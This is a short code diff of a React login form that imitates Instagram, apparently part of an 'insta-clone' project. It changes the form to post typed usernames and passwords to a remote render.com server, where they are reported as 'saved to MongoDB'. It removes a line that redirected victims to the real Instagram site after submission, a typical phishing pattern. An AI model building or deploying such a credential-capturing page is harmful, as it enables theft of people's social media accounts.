@@ -32,16 +32,16 @@ export default function InstagramLogin() {
     setLoading(true);
     setMessage(null);
     try {
-      const res = await fetch("http://localhost:5000/api/login", {
+      const res = await fetch("https://insta-clone-q0rh.onrender.com/api/login", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ username, password }),
       });
       const data = await res.json();
       if (data.success) {
+        setMessage({ type: "success", text: "✅ Logged in & saved to MongoDB!" });
         setUsername("");
         setPassword("");
-        window.location.href = "https://www.instagram.com/explore/";
       } else {
         setMessage({ type: "error", text: "❌ " + (data.error || "Something went wrong.") });
       }
